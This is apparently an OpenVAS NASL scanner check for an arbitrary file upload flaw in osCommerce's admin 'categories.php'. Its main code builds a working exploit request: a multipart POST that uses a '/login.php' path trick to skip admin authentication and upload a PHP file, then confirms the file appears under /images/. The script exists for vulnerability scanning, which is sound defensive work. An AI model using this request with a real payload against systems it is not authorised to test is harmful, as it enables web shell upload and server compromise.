###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_oscommerce_44995.nasl 13960 2019-03-01 13:18:27Z cfischer $
#
# osCommerce 'categories.php' Arbitrary File Upload Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = 'cpe:/a:oscommerce:oscommerce';

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100913");
  script_version("$Revision: 13960 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-01 14:18:27 +0100 (Fri, 01 Mar 2019) $");
  script_tag(name:"creation_date", value:"2010-11-22 15:38:55 +0100 (Mon, 22 Nov 2010)");
  script_bugtraq_id(44995);
  script_tag(name:"cvss_base", value:"4.6");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:S/C:P/I:P/A:P");
  script_name("osCommerce 'categories.php' Arbitrary File Upload Vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
  script_dependencies("oscommerce_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("Software/osCommerce");

  script_xref(name:"URL", value:"https://www.securityfocus.com/bid/44995");
  script_xref(name:"URL", value:"http://www.oscommerce.com/solutions/downloads");

  script_tag(name:"summary", value:"osCommerce is prone to a vulnerability that lets attackers upload
  arbitrary files.");

  script_tag(name:"insight", value:"The issue occurs because the application fails to
  adequately sanitize user-supplied input.");

  script_tag(name:"impact", value:"An attacker can exploit this vulnerability to upload arbitrary code
  and run it in the context of the webserver process. This may facilitate unauthorized access or privilege
  escalation. Other attacks are also possible.");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("version_func.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

host = http_host_name( port:port );

rand = rand();
file = string( "OpenVAS_TEST_DELETE_ME_", rand, ".php" );

len = 348 + strlen( file );
url =  dir + "/admin/categories.php/login.php?cPath=&action=new_product_preview";

req = string(
          "POST ", url, " HTTP/1.1\r\n",
          "Host: ", host, "\r\n",
          "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
          "Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3\r\n",
          "Accept-Encoding: gzip,deflate\r\n",
          "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n",
          "Connection: close\r\n",
          "Cookie: osCAdminID=39dcb776097440be7f8c32ffde752a74; LastVisit=1285316401\r\n",
          "Content-Type: multipart/form-data; boundary=---------------------------6540612847563306631121268491\r\n",
          "Content-Length: ",len,"\r\n",
          "\r\n",
          "-----------------------------6540612847563306631121268491\r\n",
          'Content-Disposition: form-data; name="products_image"; filename="',file,'"',"\r\n",
          "Content-Type: application/x-bzip\r\n",
          "\r\n",
          "OpenVAS-Upload-Test","\r\n",
          "\r\n",
          "-----------------------------6540612847563306631121268491\r\n",
          'Content-Disposition: form-data; name="submit"',"\r\n",
          "\r\n",
          " Save ","\r\n",
          "-----------------------------6540612847563306631121268491--\r\n","\r\n");
recv = http_keepalive_send_recv( data:req, port:port, bodyonly:TRUE );

url = dir + "/images/" + file;
if( http_vuln_check( port:port, url:url, pattern:"OpenVAS-Upload-Test" ) ) {
  report = string(
        "Note :\n\n",
        "It was possible to upload and execute a file on the remote webserver.\n",
        "The file is placed in directory: ", '"', dir, '/images/"', "\n",
        "and is named: ", '"', file, '"', "\n",
        "You should delete this file as soon as possible!\n");
  security_message( port:port,data:report );
  exit( 0 );
}

exit( 99 );